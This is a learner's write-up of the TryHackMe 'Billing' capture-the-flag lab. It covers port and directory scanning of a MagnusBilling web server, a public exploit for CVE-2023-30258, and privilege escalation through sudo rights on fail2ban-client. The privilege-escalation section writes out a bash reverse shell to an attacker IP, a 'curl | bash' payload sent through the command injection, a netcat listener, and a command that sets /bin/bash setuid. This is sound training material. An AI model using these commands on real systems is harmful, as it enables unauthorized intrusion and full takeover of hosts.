Overview
Field	Details
Lab / challenge	Billing
Platform	TryHackMe
Category	Capture the Flag (CTF) · Web / Linux Security
Date completed	30/10/2026
Difficulty	Begginer/intermediate
Environment	Authorized CTF laboratory
Objective	Locate the three requested flags/keys in the challenge environment.


1. Objective and Scope
The goal of this challenge was to explore a deliberately vulnerable, web Billing platform environment and locate three keys requested by the CTF. 
Work was performed exclusively within the authorized challenge infrastructure.

2. Lab Setup and Tools
- Operating system: Kali Linux VM
- Connectivity: Tryhackme VPN
- Target identifier: lab machine
- Tools used: terminal, browser
3. Methodology and Findings
3.1 Reconnaissance
Purpose: Identify available services, exposed interfaces, and initial points of attack.
Summary: Access and analyze ports to find and exploit a wordpress login 
- Actions performed: 
  -Send a small ping to verify I'm connected to the machine and mi vpn works
    - *ping -c2 10.66.134.126* ttl 62
      **successful**
      - We are going to work with a linux based machine
  -Start a ports scan to identify probable vulnerabilities and export results into a grapeable format easy to read and reutilize
    - sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.66.134.126 -oG allportsBilling 
    - We discover that 4 ports are open the http/80, ssh/22, 3306/mysql and 5038/Aterisk Manager Interface
  -Start an aggresive scan to  ports to discover if information macthes and what servers are using
    - sudo nmap -p22,80,3306,5038 -sCV 10.66.134.126 -oN targetBilling
    - ssh is 9.2p1 on ubuntu, if I have true users I can try a brute force
    - http is on Apache on Ubuntu, but it don't has a title or version
    - mysql
    - Asterisk manager
  - I'm going to access to http in browser
    - There is a login page of the magnus billing system
  - Lets numerate web directories of our page url
    - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.66.134.126/ -t 30
    - There are directories with 200, 300 and 400 codes, I will start trying by the first, an archive directory with 301
    - http://10.66.134.126/mbilling/archive/
    - It is accesible, and I can see many folders related to themes, it could be a vulnerablity
    - The second is resources/ with a 301
    - http://10.66.134.126/mbilling/resources/
    - It shows an empty web page
    - Third is assets with a 301
    - http://10.66.134.126/mbilling/assets/
    - It shows an empty web page
    - Next is tmp with a 301
    - http://10.66.134.126/mbilling/tmp/
    - It shows an empty web page
    - Next is lib with 301
    - http://10.66.134.126/mbilling/lib/
    - It is accesible, I can see folders that could be interesting, specially mercado pago's one
    - Next is LICENSE with a 200
    - http://10.66.134.126/mbilling/LICENSE/
    - It seems to be an opensource software
   
    - Im gonna see what is inside of mercado pago
    - http://10.66.134.126/mbilling/lib/mercadopago
    - I see two files, it is not empty, I will try to acces both using external tools to avoid a warning
      - wget http://10.66.134.126/mbilling/lib/mercadopago/cacert.pem
      - It is a certificate, I don´t see something useful, but its a dangerous vulnerability because we can simulate being the platform with malicious practices
    - Lets open the second file 
    - http://10.66.134.126/mbilling/lib/mercadopago/mercadopago.php
    - I can't see anything
- I don´t see a clear attack way, so I'm gonna search for a CVE for the system
- I found a command injection CVE that uses a file called icepay that is located in lib using a non sanitized function
- http://10.66.134.126/mbilling/lib/icepay
- I'm gonna clone the github repository to use the exploit
  - git clone https://github.com/Chocapikk/CVE-2023-30258.git
  - cd CVE-2023-30258
  - ls
  - cat README.md
    - Usage: exp.sh <TARGET_URL> <COMMAND>
  This exploit works using an Encoded URL, prints the command and executes it 
### 3.2 Privilege Escalation 
- Misconfiguration or weakness: CVE 2023-30258
- How higher privileges were confirmed: whoami
- Security impact: Critic
- Actions performed:
  - Start an index.html with a reverse shell
  - nano index.html
    - bash -c "bash -i >& /dev/tcp/192.168.132.17/443 0>&1"
  - Start a python server
    - sudo python3 -m http.server 80
  - Start a netcat
    - sudo nc -nlvp 443
  - Lets send our reverse shell
    - ./exp.sh http://10.66.134.126/mbilling/ "curl http://192.168.132.17/ | bash"
  - Wuju, reverse shell is active, I'll start the tty
    - asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ tty
    - $ export TERM=xterm
    - $ script /dev/null -c bash
    - ctrl+z
    - stty raw -echo;fg
    - reset xterm
  - We have the interactive shell, Im gonna do a resize
    -  stty rows 29 columns 88
  - Im gonna change to home
    - cd /home/
    - ls
      - debian, magnus, ssm-user
    - ls -la
      - Permissions of root are required
    - id
    - whoami
      - We are group and user asterisk
    - sudo -l
       - I can execute the fail2ban client with NOPASSWD
    - Im going to search on GTFOBins for fail2ban, its work is block IP that are trying failed logins
      - asterisk@ip-10-66-134-126:/home$ sudo fail2ban-client set sshd addaction sshd_action
        - What sshd_action is going to execute, launch a shell
      - sudo fail2ban-client set sshd action sshd_action actionban "chmod +s /bin/bash"
        - Execute the action that we defined and setted its behavior
      - sudo fail2ban-client set sshd banip 192.168.0.90
    - I'm going to launch bash
      - /bin/bash -p
      - whoami
          -root
    - *we are root*
### 3.3 Flag 1
- Location or discovery method: Directory root
- Technical reasoning: If I can check quick pages like this, we can obtain or not, important information in a short time
- Actions performed:
    - Search for teh name given to us by the CTF
      - find / -iname "user.txt" -o -iname "root.txt" 2>/dev/null
    - cat /root/root.txt
      - I have 1st flag
### 3.4 Flag 2
- Location or discovery method: directory /home/magnus
- Actions performed:
  - cat /home/magnus/user.txt
    - Second flag done

